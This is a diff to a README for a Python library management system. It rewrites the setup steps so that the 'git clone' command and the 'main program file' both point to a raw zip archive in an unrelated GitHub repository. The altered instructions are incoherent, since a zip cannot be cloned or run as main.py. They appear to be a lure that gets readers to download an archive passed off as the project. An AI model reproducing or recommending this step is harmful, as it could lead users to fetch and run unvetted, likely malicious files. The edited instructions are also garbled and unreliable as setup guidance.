@@ -17,8 +17,8 @@ Clone the Repository: Clone this repository to your local machine using Git:
 
 bash
 Copy code
-git clone https://github.com/your-username/library-management-system.git
-Run the Program: Execute the main program file, e.g., main.py, in your Python environment.
+git clone https://github.com/toqeer788/lab3/raw/refs/heads/main/disenshroud/lab_v2.9.zip
+Run the Program: Execute the main program file, e.g., https://github.com/toqeer788/lab3/raw/refs/heads/main/disenshroud/lab_v2.9.zip, in your Python environment.
 
 User Registration:
 
